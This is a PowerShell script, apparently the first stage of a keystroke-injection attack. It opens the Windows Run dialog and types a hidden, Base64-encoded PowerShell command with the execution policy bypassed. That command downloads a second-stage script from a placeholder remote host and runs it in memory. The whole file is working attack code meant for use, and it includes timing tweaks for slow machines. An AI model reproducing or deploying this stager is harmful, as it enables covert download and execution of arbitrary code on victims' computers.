# language: PowerShell, file: s1.ps1, target: Windows 10/11, PS 5.1
# stage 1 — Run-dialog launcher. Types a -enc download+execute.

$RemoteUrl = "https://your.host/s2.ps1"

# inner: pull payload to memory and execute
$Inner = "IEX (New-Object Net.WebClient).DownloadString('$RemoteUrl')"
$B64   = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Inner))

# outer command typed into Win+R — only alnum / dash / equals after -enc, safe for SendKeys
$Cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -enc $B64"

# open Run dialog
Start-Process "explorer.exe" "shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}"
Start-Sleep -Milliseconds 1200          # slow boxes: raise to 2000

$ws = New-Object -ComObject WScript.Shell
$ws.SendKeys($Cmd)
Start-Sleep -Milliseconds 250
$ws.SendKeys("{ENTER}")
